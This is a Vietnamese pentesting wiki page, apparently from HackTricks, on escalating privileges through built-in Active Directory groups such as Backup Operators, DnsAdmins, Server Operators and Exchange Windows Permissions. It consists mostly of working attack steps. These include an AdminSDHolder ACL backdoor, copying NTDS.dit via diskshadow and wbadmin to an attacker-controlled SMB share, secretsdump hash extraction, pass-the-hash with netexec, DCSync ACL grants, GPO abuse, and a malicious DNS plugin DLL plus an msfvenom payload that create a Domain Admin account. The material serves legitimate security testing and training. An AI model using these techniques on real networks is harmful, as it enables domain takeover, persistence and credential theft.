# Các nhóm có đặc quyền

{{#include ../../banners/hacktricks-training.md}}

## Các nhóm đã biết có đặc quyền quản trị

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Nhóm này được phép tạo các tài khoản và nhóm không có quyền quản trị trên domain. Ngoài ra, nhóm này cho phép đăng nhập cục bộ vào Domain Controller (DC).

Để xác định thành viên của nhóm này, hãy chạy lệnh sau:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Được phép thêm người dùng mới, cũng như đăng nhập cục bộ vào DC.<sup>[[1]](#references)</sup>

Một đường leo thang có điều kiện từ quản lý tài khoản đến quyền truy cập quản trị viên cục bộ là **một nhóm thông thường được ủy quyền đọc mật khẩu LAPS của máy tính**. Kiểm tra quyền ghi thành viên có hiệu lực trên đúng nhóm đó, xem nhóm có được bảo vệ hay không, và liệu tài khoản mới hoặc tài khoản bạn kiểm soát có thể thực sự tham gia nhóm đó hay không. Làm mới token của tài khoản trước khi kiểm tra quyền đọc LAPS trên máy tính mục tiêu. Với Windows LAPS được mã hóa, quyền đọc trong directory và quyền giải mã mật khẩu là hai yêu cầu riêng biệt; chỉ riêng tư cách thành viên nhóm hoặc tư cách thành viên Account Operators không chứng minh được có một trong hai quyền đó. Xem [phạm vi của Account Operators theo Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) và [ủy quyền Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Nhóm AdminSDHolder

Access Control List (ACL) của nhóm **AdminSDHolder** rất quan trọng vì nó thiết lập quyền cho tất cả các "nhóm được bảo vệ" trong Active Directory, bao gồm cả các nhóm có đặc quyền cao. Cơ chế này bảo vệ các nhóm đó bằng cách ngăn chặn những thay đổi trái phép.

Kẻ tấn công có thể khai thác điều này bằng cách sửa đổi ACL của nhóm **AdminSDHolder**, cấp toàn quyền cho một người dùng thông thường. Việc này sẽ trao cho người dùng đó quyền kiểm soát hoàn toàn tất cả các nhóm được bảo vệ. Nếu quyền của người dùng này bị thay đổi hoặc bị xóa, chúng sẽ tự động được khôi phục trong vòng một giờ theo thiết kế của hệ thống.<sup>[[14]](#references)</sup>

Tài liệu Windows Server gần đây vẫn xem một số nhóm operator tích hợp sẵn là đối tượng **được bảo vệ** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, v.v.). Tiến trình **SDProp** chạy trên **PDC Emulator** mặc định mỗi 60 phút, đặt `adminCount=1` và vô hiệu hóa tính kế thừa trên các đối tượng được bảo vệ. Điều này hữu ích cho cả việc duy trì quyền truy cập lẫn tìm kiếm những người dùng đặc quyền cũ đã bị xóa khỏi nhóm được bảo vệ nhưng vẫn giữ ACL không kế thừa.<sup>[[12]](#references)</sup>

Các lệnh để xem lại thành viên và sửa đổi quyền bao gồm:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Có sẵn một script để đẩy nhanh quá trình khôi phục: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Để biết thêm chi tiết, truy cập [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Khả năng xem các đối tượng đã xóa phụ thuộc vào quyền thư mục hiệu lực; chỉ riêng tên nhóm không chứng minh rằng danh tính hiện tại có thể liệt kê hoặc khôi phục một đối tượng. AD Recycle Bin phải được bật trước khi đối tượng bị xóa thì mới có thể khôi phục đầy đủ; việc khôi phục cũng yêu cầu quyền Reanimate-Tombstones trên thư mục gốc của naming context, quyền đổi tên và quyền CREATE_CHILD trên container đích. [Hướng dẫn về Recycle Bin của Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) và [quy tắc cấp quyền undelete](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) phân biệt các điều kiện này. Danh tính được cấp quyền đọc đối tượng đã xóa có thể kiểm tra các bản ghi chứa thông tin nhạy cảm:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Điều này hữu ích để **khôi phục các đường dẫn đặc quyền trước đây**. Các đối tượng đã xóa vẫn có thể làm lộ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, các SPN cũ hoặc DN của một nhóm đặc quyền đã xóa mà sau này một operator khác có thể khôi phục.

Các thuộc tính do ứng dụng định nghĩa cũng có thể lưu lại thông tin xác thực cũ khi đối tượng vẫn ở trạng thái đã xóa. Hãy xem đây là một đầu mối cần rà soát riêng: danh tính hiện tại phải được phép liệt kê đối tượng đã xóa **và** đọc thuộc tính đó, giá trị phải là thông tin xác thực có thể sử dụng được, và một principal vẫn đang hoạt động phải chấp nhận nó. Chỉ riêng tư cách thành viên nhóm hoặc tên tài khoản đã xóa không chứng minh được bất kỳ bước nào trong số đó; tránh in giá trị thông tin xác thực trong quá trình liệt kê thông thường. [Tài liệu về Recycle Bin của Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) mô tả việc bảo toàn thuộc tính sau khi xóa.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Quyền truy cập Domain Controller

Quyền truy cập các tệp trên DC bị hạn chế, trừ khi người dùng thuộc nhóm `Server Operators`; khi đó, mức độ truy cập sẽ thay đổi.

### Privilege Escalation

Có thể dùng `PsService` hoặc `sc` của Sysinternals để kiểm tra và chỉnh sửa quyền dịch vụ. Chẳng hạn, nhóm `Server Operators` có toàn quyền kiểm soát một số dịch vụ, cho phép thực thi các lệnh tùy ý và leo thang đặc quyền:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Lệnh này cho thấy `Server Operators` có toàn quyền truy cập, cho phép thao túng các service để đạt được đặc quyền cao hơn.

## Backup Operators

Việc là thành viên của `Backup Operators` có thể cấp `SeBackupPrivilege` và `SeRestorePrivilege` trên một host, tùy thuộc vào chính sách cục bộ và phiên đăng nhập. Kiểm tra **token hiệu lực của tiến trình đang chạy các lệnh** bằng `whoami /groups` và `whoami /priv`: chỉ riêng việc là thành viên không chứng minh rằng `SeBackupPrivilege` đang hiện diện và được bật. Nếu đặc quyền hiện diện nhưng đang bị tắt, nó có thể được bật trong token đó; nếu không hiện diện hoặc đã bị loại bỏ, các thao tác sao lưu này không thể sử dụng đặc quyền đó. `SeBackupPrivilege` hỗ trợ **đọc** dữ liệu được bảo vệ thông qua các API có hỗ trợ backup (ví dụ: `FILE_FLAG_BACKUP_SEMANTICS` hoặc `robocopy /B`); `SeRestorePrivilege` là một đặc quyền riêng dành cho thao tác khôi phục/ghi. Việc liệt kê thư mục và sao chép thông thường không nhất thiết sử dụng backup semantics.<sup>[[1]](#references)</sup>

Để liệt kê thành viên nhóm, hãy chạy:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Tấn công cục bộ

Trên máy chủ có effective token với `SeBackupPrivilege`, thao tác sao chép sau đây có thể đọc một tệp được bảo vệ:

1. Import các thư viện cần thiết:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Nếu đặc quyền hiện diện nhưng bị vô hiệu hóa, hãy bật nó và xác minh trạng thái trong tiến trình này:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Sao chép một tệp từ thư mục bị hạn chế, chẳng hạn:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Tấn công AD

`NTDS.dit` là cơ sở dữ liệu Active Directory trên **domain controller (DC)**. Cách này yêu cầu có token phù hợp trên DC và quyền truy cập vào volume chứa cơ sở dữ liệu; tư cách thành viên Backup Operators ở nơi khác không cấp quyền truy cập vào một DC cụ thể. Cơ sở dữ liệu đang hoạt động thường bị khóa, vì vậy hãy dùng shadow copy có thể truy cập hoặc một phương tiện sao lưu khác trước khi sao chép. Việc tạo hoặc hiển thị shadow copy cũng phụ thuộc vào cấu hình VSS của máy chủ và quyền của người gọi. Ví dụ bên dưới giả định DC lưu `NTDS.dit` trên `C:` tại `\Windows\NTDS`; hãy điều chỉnh volume và đường dẫn nếu không đúng.

#### Sử dụng diskshadow.exe

1. Nếu được phép, hãy tạo và hiển thị shadow copy của ổ `C:` trên DC dưới dạng `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Sao chép `NTDS.dit` từ shadow copy:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Hoặc sử dụng `robocopy` để sao chép tệp:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Lưu hive `SYSTEM` của DC để trích xuất ngoại tuyến. `SAM` là cơ sở dữ liệu tài khoản cục bộ trên các hệ thống thành viên; hive `SAM` của DC không thể thay thế `NTDS.dit` hoặc cung cấp hash của tài khoản Administrator trong domain:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Chuyển `ntds.dit` và `SYSTEM.SAV` sang máy phân tích rồi trích xuất hash tài khoản miền. Một hive `SAM` đã lưu từ hệ thống thành viên, cùng với hive `SYSTEM` tương ứng, sẽ cung cấp hash tài khoản cục bộ:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Nếu khôi phục được hash của Administrator **domain** từ `NTDS.dit`, có thể dùng hash đó để kiểm tra xác thực với domain. Hash Administrator cục bộ từ `SAM.SAV` là thông tin xác thực khác và không thể xác thực với tư cách Administrator của domain.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Sử dụng wbadmin.exe

1. Thiết lập hệ thống tệp NTFS cho SMB server trên máy attacker và lưu thông tin xác thực SMB vào bộ nhớ đệm trên máy mục tiêu.
2. Sử dụng `wbadmin.exe` để sao lưu hệ thống và trích xuất `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Để xem phần minh họa thực tế, hãy xem [VIDEO DEMO VỚI IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Thành viên của nhóm **DnsAdmins** có thể khai thác các đặc quyền của mình để tải một DLL tùy ý với quyền SYSTEM trên máy chủ DNS, thường được lưu trữ trên Domain Controller. Khả năng này mở ra tiềm năng khai thác đáng kể.

Để liệt kê thành viên của nhóm DnsAdmins, hãy dùng:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Thực thi DLL tùy ý (CVE‑2021‑40469)

> [!NOTE]
> Lỗ hổng này cho phép thực thi mã tùy ý với quyền SYSTEM trong dịch vụ DNS (thường là bên trong các DC). Sự cố này đã được khắc phục vào năm 2021.

Các thành viên có thể khiến máy chủ DNS tải một DLL tùy ý (từ máy cục bộ hoặc từ một share từ xa) bằng các lệnh như:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Cần khởi động lại dịch vụ DNS (có thể cần thêm quyền) để DLL được tải:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Để biết thêm chi tiết về vector tấn công này, hãy tham khảo ired.team.

#### Mimilib.dll

Bạn cũng có thể dùng mimilib.dll để thực thi lệnh bằng cách chỉnh sửa nó để chạy các lệnh cụ thể hoặc reverse shell. [Xem bài viết này](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) để biết thêm thông tin.<sup>[[15]](#references)</sup>

### Bản ghi WPAD cho MitM

DNSAdmins có thể thao túng các bản ghi DNS để thực hiện tấn công Man-in-the-Middle (MitM) bằng cách tạo bản ghi WPAD sau khi tắt danh sách chặn truy vấn toàn cục. Có thể sử dụng các công cụ như Responder hoặc Inveigh để giả mạo và thu thập lưu lượng mạng.

### Event Log Readers
Các thành viên có thể truy cập nhật ký sự kiện và có khả năng tìm thấy thông tin nhạy cảm như mật khẩu dạng văn bản thuần hoặc chi tiết thực thi lệnh:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Nhóm này có thể sửa đổi DACL trên đối tượng domain, từ đó có khả năng cấp quyền DCSync. Các kỹ thuật leo thang đặc quyền khai thác nhóm này được trình bày chi tiết trong repo GitHub Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Nếu có thể hoạt động với tư cách thành viên của nhóm này, kiểu lạm dụng kinh điển là cấp cho principal do kẻ tấn công kiểm soát các quyền replication cần thiết để [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Trước đây, **PrivExchange** kết hợp quyền truy cập mailbox, ép Exchange xác thực và LDAP relay để đạt được chính primitive này. Ngay cả khi đường relay đó đã được giảm thiểu, việc trực tiếp là thành viên của `Exchange Windows Permissions` hoặc kiểm soát một máy chủ Exchange vẫn là con đường có giá trị cao để giành quyền replication domain.

## Hyper-V Administrators

Hyper-V Administrators có toàn quyền truy cập Hyper-V, có thể bị khai thác để kiểm soát các Domain Controller được ảo hóa. Việc này bao gồm clone DC đang hoạt động và trích xuất NTLM hashes từ file NTDS.dit.

### Ví dụ khai thác

Cách lạm dụng thực tế thường là **truy cập ngoại tuyến vào đĩa/checkpoint của DC** thay vì các thủ thuật LPE cấp host cũ. Khi có quyền truy cập vào Hyper-V host, operator có thể tạo checkpoint hoặc export một Domain Controller được ảo hóa, mount VHDX và trích xuất `NTDS.dit`, `SYSTEM` cùng các secret khác mà không cần động đến LSASS bên trong guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Từ đó, sử dụng lại quy trình `Backup Operators` để sao chép ngoại tuyến `Windows\NTDS\ntds.dit` và các registry hive. Quy trình liên quan đến tệp sao lưu:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Nhóm này cho phép thành viên tạo Group Policy trong domain. Tuy nhiên, thành viên không thể áp dụng group policy cho người dùng hoặc nhóm, cũng như chỉnh sửa GPO hiện có.

Điểm quan trọng là **người tạo sẽ trở thành chủ sở hữu của GPO mới** và thường có đủ quyền để chỉnh sửa GPO đó về sau. Điều này khiến nhóm trở nên đáng chú ý trong các trường hợp bạn có thể:

- tạo GPO độc hại và thuyết phục admin liên kết nó với OU/domain mục tiêu
- chỉnh sửa GPO bạn đã tạo và hiện đang được liên kết ở vị trí hữu ích
- lạm dụng một quyền được ủy quyền khác cho phép bạn liên kết GPO, trong khi nhóm này cung cấp quyền chỉnh sửa

Trên thực tế, việc lạm dụng thường bao gồm thêm **Immediate Task**, **startup script**, **thành viên local admin** hoặc thay đổi **user rights assignment** thông qua các tệp policy được lưu trong SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Nếu chỉnh sửa GPO thủ công thông qua `SYSVOL`, hãy nhớ rằng chỉ thay đổi nội dung là chưa đủ: cần cập nhật cả `versionNumber`, `GPT.ini` và đôi khi cả `gPCMachineExtensionNames`, nếu không các máy khách sẽ bỏ qua lần làm mới policy.<sup>[[9]](#references)</sup>

## Organization Management

Trong các môi trường triển khai **Microsoft Exchange**, một nhóm đặc biệt có tên **Organization Management** sở hữu nhiều quyền đáng kể. Nhóm này có đặc quyền **truy cập mailbox của tất cả người dùng trong domain** và có **toàn quyền kiểm soát** Organizational Unit (OU) 'Microsoft Exchange Security Groups'. Quyền kiểm soát này bao gồm cả nhóm **`Exchange Windows Permissions`**, có thể bị khai thác để leo thang đặc quyền.

### Khai thác đặc quyền và lệnh

#### Print Operators

Các thành viên của nhóm **Print Operators** được cấp một số đặc quyền, bao gồm **`SeLoadDriverPrivilege`**, cho phép họ **đăng nhập cục bộ vào Domain Controller**, tắt máy và quản lý máy in. Để khai thác các đặc quyền này, đặc biệt khi **`SeLoadDriverPrivilege`** không hiển thị trong ngữ cảnh chưa được nâng quyền, cần bypass User Account Control (UAC).<sup>[[1]](#references)</sup>

Để liệt kê các thành viên của nhóm này, hãy dùng lệnh PowerShell sau:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Trên Domain Controllers, nhóm này nguy hiểm vì chính sách Domain Controller mặc định cấp **`SeLoadDriverPrivilege`** cho `Print Operators`. Nếu lấy được token nâng cao của một thành viên trong nhóm này, bạn có thể bật đặc quyền và tải một driver đã ký nhưng có lỗ hổng để leo thang lên kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Để biết chi tiết về xử lý token, xem [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Các thành viên của nhóm này được cấp quyền truy cập vào PC qua Remote Desktop Protocol (RDP). Có thể dùng các lệnh PowerShell để liệt kê những thành viên này:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Có thể tìm thêm thông tin chi tiết về cách khai thác RDP trong các tài liệu pentesting chuyên biệt.

#### Người dùng Quản lý Từ xa

Các thành viên có thể truy cập máy tính qua **Windows Remote Management (WinRM)**. Có thể liệt kê các thành viên này bằng cách:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Đối với các kỹ thuật khai thác liên quan đến **WinRM**, cần tham khảo tài liệu cụ thể.

#### Server Operators

Nhóm này có quyền thực hiện nhiều cấu hình khác nhau trên Domain Controllers, bao gồm quyền sao lưu và khôi phục, thay đổi thời gian hệ thống và tắt hệ thống.<sup>[[1]](#references)</sup> Để enumerate các thành viên, lệnh được cung cấp là:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Trên Domain Controllers, `Server Operators` thường kế thừa đủ quyền để **cấu hình lại hoặc khởi động/dừng dịch vụ**, đồng thời được cấp `SeBackupPrivilege`/`SeRestorePrivilege` thông qua chính sách DC mặc định. Trên thực tế, điều này biến họ thành cầu nối giữa **lạm dụng quyền điều khiển dịch vụ** và **trích xuất NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Việc không liệt kê được các dịch vụ không có nghĩa là không thể truy cập một **dịch vụ đã biết**. Service Control Manager kiểm tra riêng quyền `SC_MANAGER_ENUMERATE_SERVICE` để liệt kê và `SC_MANAGER_CONNECT` để kết nối; mở một dịch vụ được chỉ định tên sẽ kiểm tra các quyền riêng của dịch vụ đó, bao gồm `SERVICE_CHANGE_CONFIG` và `SERVICE_START`. Hãy kiểm tra token hiệu lực và ACL của dịch vụ đó ngay cả khi lệnh `sc.exe query` thông thường thất bại. Chỉ có quyền cấu hình thì mới chỉ là một khả năng: danh tính chạy dịch vụ, quyền khởi động/dừng và một trigger có thể sử dụng được vẫn quyết định liệu có thể chuyển lên đặc quyền cao hơn hay không. Xem [tài liệu tham khảo của Microsoft về quyền truy cập dịch vụ](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Nếu ACL của dịch vụ cấp cho nhóm này quyền thay đổi/khởi động, hãy trỏ dịch vụ đến một lệnh tùy ý, khởi động dịch vụ với tư cách `LocalSystem`, rồi khôi phục `binPath` ban đầu. Nếu quyền điều khiển dịch vụ bị khóa, hãy chuyển sang các kỹ thuật `Backup Operators` ở trên để sao chép `NTDS.dit`.

## References

- [1] [ired.team – Tài khoản đặc quyền và Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Lạm dụng SeLoadDriverPrivilege để leo thang đặc quyền](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Lạm dụng quyền GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Lạm dụng GPO, Phần 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Hướng dẫn của Red Teamer về GPO và OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Hàm ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP ẩn danh → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Phụ lục C: Tài khoản và nhóm được bảo vệ trong Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Cách lạm dụng và cài backdoor vào AdminSDHolder để duy trì quyền Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Lạm dụng đặc quyền DnsAdmins để leo thang trong Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Thông tin về lạm dụng cạnh GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Hàm NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
